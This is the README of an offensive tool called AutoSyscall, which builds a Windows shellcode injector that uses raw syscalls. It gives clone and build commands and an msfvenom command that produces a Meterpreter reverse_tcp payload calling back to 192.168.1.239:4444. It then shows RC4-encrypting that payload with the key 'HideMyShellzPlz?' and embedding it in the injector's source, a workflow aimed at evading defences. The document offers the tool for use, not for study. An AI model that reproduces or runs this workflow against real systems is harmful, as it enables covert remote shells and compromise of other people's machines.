# AutoSyscall

This library builds and makes a shellcode injector for all versions of Windows using raw syscalls.

This code is a PoC and has only been tested windows 10 x64 version 1909, this is because of the syscall numbers changing between versions, the values can be found [here](https://j00ru.vexillium.org/syscalls/nt/64/).

## Install & Build

```
git clone https://github.com/bats3c/DefensiveInjector
cd DefensiveInjector
python generate.py
make _XP_SP2
```
The _XP_SP2 value is the define string for the shellcode.asm file, this will target specific versions of windows.

## Using different shellcode

- ##### Generate your shellcode either with msfvenom or something else
    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin`

- ##### Encrypt the shellcode
    Keeping in mind that if you change it here you will need to update the key on line 132 in `main.c`
    `cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin`

- ##### Format the shellcode
    Run `xxd -i encmeter.bin` then replace everything between line 10-60 with the output

## Dependencies

```
sudo apt install mingw-w64 nasm python
```
